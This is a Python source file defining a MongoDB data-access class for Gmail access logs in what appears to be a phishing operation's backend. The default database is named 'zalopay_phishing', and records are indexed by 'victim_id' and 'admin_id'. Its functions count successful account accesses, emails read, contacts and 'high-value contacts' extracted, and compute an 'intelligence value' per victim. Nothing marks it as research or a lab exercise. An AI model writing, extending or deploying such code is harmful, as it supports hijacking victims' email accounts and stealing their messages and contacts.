"""
Gmail Access Logs Model
Database operations for Gmail access logs collection
"""

import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any
from pymongo import MongoClient
from pymongo.errors import PyMongoError

logger = logging.getLogger(__name__)

class GmailAccessLogModel:
    """Gmail access logs database operations"""

    def __init__(self, mongodb_client: Optional[MongoClient] = None):
        self.client = mongodb_client
        self.db = None
        self.collection = None

    async def connect(self, database_name: str = "zalopay_phishing"):
        """Connect to MongoDB"""
        try:
            if self.client:
                self.db = self.client[database_name]
                self.collection = self.db.gmail_access_logs
                logger.info("Connected to Gmail access logs collection")
                return True
            return False
        except PyMongoError as e:
            logger.error(f"MongoDB connection error: {e}")
            return False

    async def create_access_log(self, log_data: Dict[str, Any]) -> Optional[str]:
        """Create a new Gmail access log entry"""
        try:
            if not self.collection:
                await self.connect()

            # Add metadata
            log_data["created_at"] = datetime.now(timezone.utc)
            
            # Insert document
            result = self.collection.insert_one(log_data)
            
            if result.inserted_id:
                logger.info(f"Gmail access log created: {result.inserted_id}")
                return str(result.inserted_id)
            else:
                logger.error("Failed to create Gmail access log")
                return None

        except PyMongoError as e:
            logger.error(f"Error creating Gmail access log: {e}")
            return None

    async def get_access_logs_by_victim_id(self, victim_id: str) -> List[Dict[str, Any]]:
        """Get all Gmail access logs for a specific victim"""
        try:
            if not self.collection:
                await self.connect()

            logs = list(self.collection.find(
                {"victim_id": victim_id},
                sort=[("created_at", -1)]
            ))

            # Convert ObjectId to string
            for log in logs:
                log["_id"] = str(log["_id"])

            return logs

        except PyMongoError as e:
            logger.error(f"Error getting Gmail access logs by victim ID: {e}")
            return []

    async def get_access_logs_by_admin_id(self, admin_id: str, limit: int = 50) -> List[Dict[str, Any]]:
        """Get Gmail access logs for a specific admin user"""
        try:
            if not self.collection:
                await self.connect()

            logs = list(self.collection.find(
                {"admin_id": admin_id},
                sort=[("created_at", -1)],
                limit=limit
            ))

            # Convert ObjectId to string
            for log in logs:
                log["_id"] = str(log["_id"])

            return logs

        except PyMongoError as e:
            logger.error(f"Error getting Gmail access logs by admin ID: {e}")
            return []

    async def get_access_log_by_session_id(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get Gmail access log by session ID"""
        try:
            if not self.collection:
                await self.connect()

            log = self.collection.find_one(
                {"access_session.session_id": session_id}
            )

            if log:
                log["_id"] = str(log["_id"])

            return log

        except PyMongoError as e:
            logger.error(f"Error getting Gmail access log by session ID: {e}")
            return None

    async def update_access_log(self, session_id: str, update_data: Dict[str, Any]) -> bool:
        """Update Gmail access log"""
        try:
            if not self.collection:
                await self.connect()

            update_data["updated_at"] = datetime.now(timezone.utc)

            result = self.collection.update_one(
                {"access_session.session_id": session_id},
                {"$set": update_data}
            )

            if result.modified_count > 0:
                logger.info(f"Gmail access log updated: {session_id}")
                return True
            else:
                logger.warning(f"No Gmail access log updated for session: {session_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error updating Gmail access log: {e}")
            return False

    async def delete_access_log(self, session_id: str) -> bool:
        """Delete Gmail access log"""
        try:
            if not self.collection:
                await self.connect()

            result = self.collection.delete_one(
                {"access_session.session_id": session_id}
            )

            if result.deleted_count > 0:
                logger.info(f"Gmail access log deleted: {session_id}")
                return True
            else:
                logger.warning(f"No Gmail access log deleted for session: {session_id}")
                return False

        except PyMongoError as e:
            logger.error(f"Error deleting Gmail access log: {e}")
            return False

    async def count_total_accesses(self) -> int:
        """Count total Gmail access attempts"""
        try:
            if not self.collection:
                await self.connect()

            count = self.collection.count_documents({})
            return count

        except PyMongoError as e:
            logger.error(f"Error counting total Gmail accesses: {e}")
            return 0

    async def count_successful_accesses(self) -> int:
        """Count successful Gmail access attempts"""
        try:
            if not self.collection:
                await self.connect()

            count = self.collection.count_documents(
                {"access_session.success": True}
            )
            return count

        except PyMongoError as e:
            logger.error(f"Error counting successful Gmail accesses: {e}")
            return 0

    async def count_total_emails_extracted(self) -> int:
        """Count total emails extracted across all accesses"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": None,
                        "total_emails": {
                            "$sum": "$actions_performed.emails_accessed.total_read"
                        }
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            return result[0]["total_emails"] if result else 0

        except PyMongoError as e:
            logger.error(f"Error counting total emails extracted: {e}")
            return 0

    async def count_total_contacts_extracted(self) -> int:
        """Count total contacts extracted across all accesses"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": None,
                        "total_contacts": {
                            "$sum": "$actions_performed.contacts_extracted.total_contacts"
                        }
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            return result[0]["total_contacts"] if result else 0

        except PyMongoError as e:
            logger.error(f"Error counting total contacts extracted: {e}")
            return 0

    async def get_average_intelligence_value(self) -> float:
        """Get average intelligence value across all accesses"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {
                    "$group": {
                        "_id": None,
                        "average_value": {
                            "$avg": "$intelligence_analysis.overall_intelligence_value"
                        }
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            return result[0]["average_value"] if result and result[0]["average_value"] else 0.0

        except PyMongoError as e:
            logger.error(f"Error getting average intelligence value: {e}")
            return 0.0

    async def get_recent_accesses(self, limit: int = 10) -> List[Dict[str, Any]]:
        """Get recent Gmail access logs"""
        try:
            if not self.collection:
                await self.connect()

            logs = list(self.collection.find(
                {},
                sort=[("created_at", -1)],
                limit=limit,
                projection={
                    "admin_id": 1,
                    "victim_id": 1,
                    "access_session.session_id": 1,
                    "access_session.success": 1,
                    "access_session.start_time": 1,
                    "intelligence_analysis.overall_intelligence_value": 1,
                    "created_at": 1
                }
            ))

            # Convert ObjectId to string
            for log in logs:
                log["_id"] = str(log["_id"])

            return logs

        except PyMongoError as e:
            logger.error(f"Error getting recent Gmail accesses: {e}")
            return []

    async def get_access_statistics_by_admin(self, admin_id: str) -> Dict[str, Any]:
        """Get Gmail access statistics for a specific admin"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {"$match": {"admin_id": admin_id}},
                {
                    "$group": {
                        "_id": None,
                        "total_accesses": {"$sum": 1},
                        "successful_accesses": {
                            "$sum": {"$cond": ["$access_session.success", 1, 0]}
                        },
                        "total_emails": {
                            "$sum": "$actions_performed.emails_accessed.total_read"
                        },
                        "total_contacts": {
                            "$sum": "$actions_performed.contacts_extracted.total_contacts"
                        },
                        "average_intelligence_value": {
                            "$avg": "$intelligence_analysis.overall_intelligence_value"
                        },
                        "last_access": {"$max": "$created_at"}
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            if result:
                stats = result[0]
                stats["success_rate"] = (
                    stats["successful_accesses"] / stats["total_accesses"]
                    if stats["total_accesses"] > 0 else 0
                )
                return stats
            else:
                return {
                    "total_accesses": 0,
                    "successful_accesses": 0,
                    "success_rate": 0,
                    "total_emails": 0,
                    "total_contacts": 0,
                    "average_intelligence_value": 0.0,
                    "last_access": None
                }

        except PyMongoError as e:
            logger.error(f"Error getting Gmail access statistics by admin: {e}")
            return {}

    async def get_victim_access_summary(self, victim_id: str) -> Dict[str, Any]:
        """Get Gmail access summary for a specific victim"""
        try:
            if not self.collection:
                await self.connect()

            pipeline = [
                {"$match": {"victim_id": victim_id}},
                {
                    "$group": {
                        "_id": None,
                        "total_accesses": {"$sum": 1},
                        "successful_accesses": {
                            "$sum": {"$cond": ["$access_session.success", 1, 0]}
                        },
                        "total_emails": {
                            "$sum": "$actions_performed.emails_accessed.total_read"
                        },
                        "total_contacts": {
                            "$sum": "$actions_performed.contacts_extracted.total_contacts"
                        },
                        "high_value_contacts": {
                            "$sum": "$actions_performed.contacts_extracted.high_value_contacts"
                        },
                        "average_intelligence_value": {
                            "$avg": "$intelligence_analysis.overall_intelligence_value"
                        },
                        "first_access": {"$min": "$created_at"},
                        "last_access": {"$max": "$created_at"}
                    }
                }
            ]

            result = list(self.collection.aggregate(pipeline))
            if result:
                stats = result[0]
                stats["success_rate"] = (
                    stats["successful_accesses"] / stats["total_accesses"]
                    if stats["total_accesses"] > 0 else 0
                )
                return stats
            else:
                return {
                    "total_accesses": 0,
                    "successful_accesses": 0,
                    "success_rate": 0,
                    "total_emails": 0,
                    "total_contacts": 0,
                    "high_value_contacts": 0,
                    "average_intelligence_value": 0.0,
                    "first_access": None,
                    "last_access": None
                }

        except PyMongoError as e:
            logger.error(f"Error getting victim Gmail access summary: {e}")
            return {}

    async def cleanup_old_logs(self, days_to_keep: int = 90) -> int:
        """Clean up old Gmail access logs"""
        try:
            if not self.collection:
                await self.connect()

            cutoff_date = datetime.now(timezone.utc) - timedelta(days=days_to_keep)

            result = self.collection.delete_many({
                "created_at": {"$lt": cutoff_date}
            })

            deleted_count = result.deleted_count
            if deleted_count > 0:
                logger.info(f"Cleaned up {deleted_count} old Gmail access logs")

            return deleted_count

        except PyMongoError as e:
            logger.error(f"Error cleaning up old Gmail access logs: {e}")
            return 0

    async def get_recent_access_logs(self, limit: int = 10) -> List[Dict[str, Any]]:
        """Get recent Gmail access logs"""
        try:
            if not self.collection:
                await self.connect()

            logs = list(self.collection.find(
                {},
                sort=[("created_at", -1)],
                limit=limit
            ))

            # Convert ObjectId to string
            for log in logs:
                log["_id"] = str(log["_id"])

            return logs

        except PyMongoError as e:
            logger.error(f"Error getting recent Gmail access logs: {e}")
            return []

    async def health_check(self) -> bool:
        """Health check for Gmail access logs collection"""
        try:
            if not self.collection:
                await self.connect()

            # Test basic operations
            self.collection.find_one()
            return True

        except PyMongoError as e:
            logger.error(f"Gmail access logs health check failed: {e}")
            return False